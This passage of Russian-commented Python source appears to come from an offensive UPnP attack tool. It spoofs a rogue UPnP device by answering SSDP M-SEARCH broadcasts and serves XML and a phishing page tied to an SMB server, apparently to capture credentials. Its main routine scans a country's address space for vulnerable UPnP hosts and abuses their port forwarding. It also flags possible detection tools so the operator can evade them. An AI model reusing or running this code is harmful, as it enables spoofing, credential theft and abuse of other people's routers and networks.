    # Генерирует случайную hex-строку 
    @staticmethod
    def gen_random(length):
        chrs = 'abcdef'
        dgts = '0123456789'
        result = ''.join(random.choices(chrs + dgts, k=length))
        return result


    # Эта функция отвечает клиентам, сообщая им, где они могут
    # получить доступ к дополнительной информации о мошенническом устройстве. 
    # Ключевыми здесь являются заголовок «LOCATION» и заголовок «ST».
    # Когда клиент получает эту информацию, он перехододит по полученному в LOCATION пути 
    # и анализируют XML-файл.
    def send_location(self, address, requested_st):
        url = 'http://{}:{}/ssdp/device-desc.xml'.format(self.interface_ip,
                                                         self.port)
        date_format = formatdate(timeval=None, localtime=False, usegmt=True)

        ssdp_response = ('HTTP/1.1 200 OK\r\n'
                      'CACHE-CONTROL: max-age=1800\r\n'
                      'DATE: {}\r\n'
                      'EXT:\r\n'
                      'LOCATION: {}\r\n'
                      'OPT: "http://schemas.upnp.org/upnp/1/0/"; ns=01\r\n'
                      '01-NLS: {}\r\n'
                      'SERVER: UPnP/1.0\r\n'
                      'ST: {}\r\n'
                      'USN: {}::{}\r\n'
                      'BOOTID.UPNP.ORG: 0\r\n'
                      'CONFIGID.UPNP.ORG: 1\r\n'
                      '\r\n\r\n'
                      .format(date_format,
                              url,
                              self.uuid_session,
                              requested_st,
                              self.uuid_session,
                              requested_st))
        ssdp_response = bytes(ssdp_response, 'utf-8')
        self.sock.sendto(ssdp_response, address)


    # Эта функция анализирует необработанные данные, полученные в объекте класса SSDP_sniffer.
    # Если заголовок M-SEARCH найден, он будет искать запрашиваемый тип услуги (ST) 
    # и сообщит клиенту, что у нас есть тип устройства, который он ищет.
    # Функция сохранит только первый раз, когда клиент вызывает определенный тип М-SEARCH. 
    # Это сохраняет выход более читабельным, так как клиенты могут отправлять повторяющиеся запросы.
    def process_data(self, data, address):
        external_ip = address[0]
        header_st = re.findall(r'(?i)\\r\\nST:(.*?)\\r\\n', str(data))
        if 'M-SEARCH' in str(data) and header_st:
            requested_st = header_st[0].strip()
            if re.match(self.valid_st, requested_st):
                if (address[0], requested_st) not in self.hosts:
                    print(f'\033[94m [M-SEARCH]\t New Host {external_ip}, \
                                Service Type: {requested_st}')
                    self.hosts.append((address[0], requested_st))
                # if not self.analyze_mode:
                    self.send_location(address, requested_st)
            else:
                print(f'\033[93m [DETECTION]\t Odd ST ({requested_st}) from {external_ip}. \
                                Possible detection tool!')


# Метод запускает объект sniffer, получающий и обрабатывающий
# широковещательные UDP-запросы
def get_msearch(sniffer):
    while True:
        data, address = sniffer.sock.recvfrom(1024)
        sniffer.process_data(data, address)


# Метод запускает веб-сервер для доставки XML-файлов и фишинговой страницы.
def serve_html(interface_ip, port, upnp):
    MultiThreadedHTTPServer.allow_reuse_address = True
    upnp_server = MultiThreadedHTTPServer((interface_ip, port), upnp)
    upnp_server.serve_forever()


def main():
    args = get_arguments()
    if args.input == None and args.country == None and args.rogue_upnp == False:
        exit('[!] Specify the country for scanning, or a file with hosts')
    elif args.input == None and args.country != None:
        if args.output == None:
            exit('[!] Specify a file to record scan results')
        get_vuln_ips(args.country)
        if args.discover != False:
            discover_upnp_locations(args.country + '.txt', args.output)
        if args.port_forwarding != False:
            port_forwarding(args.output)
    elif args.input != None:
        if args.output == None:
            exit('[!] Specify a file to record scan results')
        if args.discover != False:
            discover_upnp_locations(args.input, args.output)
            # locations = set()
            # with open('aaaaaaa.txt', "r") as f:
            #     for x in f:
            #         locations.add(x.strip())
            # locations = {'http://211.21.193.152:65535/rootDesc.xml'}
            # parse_locations(locations)
        if args.port_forwarding != False:
            port_forwarding(args.output)
    elif args.rogue_upnp != False:
        if args.interface == None:
            exit('[!] No interface provided')
        interface_ip = get_ip(args.interface)
        smb_server_ip = set_smb_server_ip(args.smb, interface_ip)
        create_rogue_upnp_point(smb_server_ip)

        # sniffer = SSDP_sniffer(interface_ip, args.port, args.analyze)
        sniffer = SSDP_sniffer(interface_ip, args.port)
        ssdp_server = Process(target=get_msearch, args=(sniffer,))

        upnp_args = {'template_dir':args.template_dir,
                 'uuid_session':sniffer.uuid_session,
                 'smb_server_ip':smb_server_ip,
                 'redirect_url':args.redirect_url,
                 'is_auth':args.is_auth,
                 'interface_ip':interface_ip,
                 'realm':args.realm,
                 'port':args.port}
        
        upnp = create_class(upnp_args)

        web_server = Process(target=serve_html,
                            args=(interface_ip, args.port, upnp))

        print_rogue_upnp_details(args, interface_ip, smb_server_ip)

        try:
            ssdp_server.start()
            web_server.start()
            signal.pause()
        except (KeyboardInterrupt, SystemExit):
            web_server.terminate()
            ssdp_server.terminate()
            exit('\n [-] Stopping threads and exiting...\n')


if __name__ == "__main__":
    try:
        main()
    except PermissionError:
        print('Sudo required')
    except KeyboardInterrupt:
        print('[-] Interrupted')
